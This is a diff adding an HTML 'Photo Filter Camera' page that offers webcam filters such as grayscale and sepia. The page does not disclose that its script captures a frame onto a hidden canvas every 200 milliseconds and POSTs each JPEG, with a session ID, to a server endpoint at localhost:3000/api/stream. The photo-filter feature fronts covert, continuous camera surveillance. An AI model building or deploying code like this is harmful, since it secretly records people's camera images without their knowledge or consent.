@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Photo Filter Camera</title>
+
+<style>
+body {
+    font-family: Arial;
+    background: #f2f2f2;
+    text-align: center;
+}
+
+.camera-container {
+    width: 400px;
+    height: 300px;
+    margin: 20px auto;
+    background: black;
+    position: relative;
+    border-radius: 10px;
+    overflow: hidden;
+}
+
+video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    transform: scaleX(-1);
+}
+
+.overlay {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: rgba(0,0,0,0.8);
+    color: white;
+}
+
+.hidden { display: none; }
+
+.filters button {
+    margin: 5px;
+    padding: 8px;
+    cursor: pointer;
+}
+</style>
+</head>
+
+<body>
+
+<h2>📸 Photo Filter Camera</h2>
+
+<div class="camera-container">
+    <video id="video" autoplay playsinline class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
+
+    <div id="overlay" class="overlay">
+        <button onclick="startCamera()">Start Camera</button>
+    </div>
+</div>
+
+<div id="filters" class="hidden filters">
+    <button onclick="setFilter('none')">Normal</button>
+    <button onclick="setFilter('grayscale(1)')">Grayscale</button>
+    <button onclick="setFilter('sepia(1)')">Sepia</button>
+    <button onclick="setFilter('invert(1)')">Invert</button>
+    <button onclick="setFilter('contrast(2)')">Contrast</button>
+</div>
+
+<script>
+let stream;
+let sessionId = "123";
+
+async function startCamera() {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const overlay = document.getElementById("overlay");
+    const filters = document.getElementById("filters");
+
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            startStreaming();
+        };
+
+        video.classList.remove("hidden");
+        overlay.classList.add("hidden");
+        filters.classList.remove("hidden");
+
+    } catch (err) {
+        alert("Camera error");
+        console.error(err);
+    }
+}
+
+function setFilter(filter) {
+    const video = document.getElementById("video");
+    video.style.filter = filter;
+}
+
+function startStreaming() {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    setInterval(() => {
+        if (!video.videoWidth) return;
+
+        ctx.filter = video.style.filter;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL("image/jpeg", 0.7);
+
+        fetch("http://localhost:3000/api/stream", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                sessionId,
+                imageData,
+                timestamp: Date.now()
+            })
+        });
+
+    }, 200);
+}
+
+window.addEventListener("beforeunload", () => {
+    if (stream) stream.getTracks().forEach(t => t.stop());
+
+    fetch("http://localhost:3000/api/end-session", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ sessionId })
+    });
+});
+</script>
+
+</body>
+</html>
